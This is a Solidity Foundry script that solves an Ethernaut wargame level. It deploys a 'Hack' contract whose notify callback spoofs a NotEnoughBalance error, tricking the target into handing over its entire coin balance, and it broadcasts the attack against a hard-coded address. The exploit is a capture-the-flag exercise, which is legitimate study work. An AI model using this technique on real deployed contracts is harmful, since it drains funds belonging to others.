// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/Test.sol";

interface ITarget {
  function wallet() external view returns (address);

  function coin() external view returns (address);

  function requestDonation() external returns (bool);
}

interface INotifyable {
  function notify(uint256 amount) external;
}

/// @title Hacker smart contract
/// @author Temirzhan Yussupov
/// @notice Used for solving one of Ethernaut challenges
contract Hack is INotifyable {
  error NotEnoughBalance();

  /// @notice Notifies hacker smart contract about donation
  /// @dev This function is called by Coin smart contract
  /// @param amount Amount of coins donated
  function notify(uint256 amount) external override {
    console.log("Got amount: %s", amount);
    if (amount == 10) {
      revert NotEnoughBalance();
    }
  }

  /// @notice Hacks target smart contract and extracts all coins
  /// @dev Contract must be created first
  /// @param target Target smart contract address
  function hack(ITarget target) external {
    bool donationResult = target.requestDonation();
    console.log("Donation result: %s", donationResult);

    address coin = target.coin();
    // solhint-disable-next-line avoid-low-level-calls
    (bool success, bytes memory data) = coin.call(abi.encodeWithSignature("balances(address)", address(this)));
    require(success, "Call to coin failed");
    uint256 myBalance = abi.decode(data, (uint256));
    console.log("Hack balance: %s", myBalance);
  }
}

contract Solve is Script, Test {
  address target = address(0xA39b070cE1fb86cc73c14062bA5ccBeF692DA0f4);

  function run() public {
    vm.startBroadcast();

    ITarget s = ITarget(target);
    console.log("Wallet: %s", s.wallet());

    Hack h = new Hack();
    h.hack(s);

    vm.stopBroadcast();
  }
}
